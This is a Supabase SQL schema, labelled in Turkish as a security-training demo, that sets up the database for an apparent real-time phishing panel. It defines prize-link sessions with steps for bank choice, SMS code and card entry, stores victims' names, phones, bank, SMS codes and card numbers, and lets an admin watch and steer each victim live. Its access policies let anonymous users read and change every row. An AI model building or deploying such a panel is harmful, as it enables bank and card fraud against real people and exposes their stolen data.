-- Spar demo – güvenlik eğitimi / test ortamı için Supabase şeması
-- Supabase SQL Editor'da sırayla çalıştırın. Realtime için tabloya abonelik gerekebilir.

-- ---------------------------------------------------------------------------
-- 1) Tablo: sessions
-- ---------------------------------------------------------------------------
create extension if not exists "pgcrypto";

create table public.sessions (
  id text primary key default encode(gen_random_bytes(12), 'hex'),
  amount integer not null default 0 check (amount >= 0),
  current_step text not null default 'win'
    check (current_step in ('win', 'banken', 'wait', 'sms', 'card', 'congrats', 'special_approval', 'SPECIAL_INFO')),
  status text not null default 'offline'
    check (status in ('online', 'offline', 'SUCCESS', 'CONGRATS', 'SPECIAL_INFO')),
  sms_digits integer not null default 6 check (sms_digits >= 4 and sms_digits <= 12),
  form_data jsonb not null default '{}'::jsonb,
  is_hidden boolean default false,
  created_at timestamptz not null default now(),
  updated_at timestamptz not null default now()
);

comment on table public.sessions is 'Eğitim demosu: özel link oturumu; form_data = isim, banka, kart vb. JSON';
comment on column public.sessions.id is 'Özel link kimliği (/win/[id])';
comment on column public.sessions.current_step is 'Kullanıcının gösterileceği adım';
comment on column public.sessions.form_data is 'Ör: {"firstName","lastName","phone","bank","smsCode","cardNumber",...}';

create index sessions_created_at_idx on public.sessions (created_at desc);

-- Realtime ile eski/yeni satır filtreleri için önerilir
alter table public.sessions replica identity full;

-- updated_at otomatik
create or replace function public.set_sessions_updated_at()
returns trigger as $$
begin
  new.updated_at = now();
  return new;
end;
$$ language plpgsql security definer set search_path = public;

create trigger sessions_set_updated_at
before update on public.sessions
for each row execute function public.set_sessions_updated_at();

-- ---------------------------------------------------------------------------
-- 2) Realtime (Supabase Dashboard > Database > Replication ile de açılabilir)
-- ---------------------------------------------------------------------------
alter publication supabase_realtime add table public.sessions;

-- ---------------------------------------------------------------------------
-- 3) RLS – demo için gevşek anon politikaları; üretimde sıkılaştırın
-- ---------------------------------------------------------------------------
alter table public.sessions enable row level security;

-- Giriş yapmış admin: tam CRUD
create policy "sessions_authenticated_all"
on public.sessions
for all
to authenticated
using (true)
with check (true);

-- Anon kullanıcı (demo link): satır okuma/güncelleme — URL bilgisi yetki sayılır
-- UYARI: Anon anahtarıyla tüm satırlar okunabilir; gerçek sistemde RPC veya capability token kullanın.
create policy "sessions_anon_select_demo"
on public.sessions
for select
to anon
using (true);

create policy "sessions_anon_update_demo"
on public.sessions
for update
to anon
using (true)
with check (true);

-- Anon INSERT yok (session oluşturma yalnızca authenticated admin)
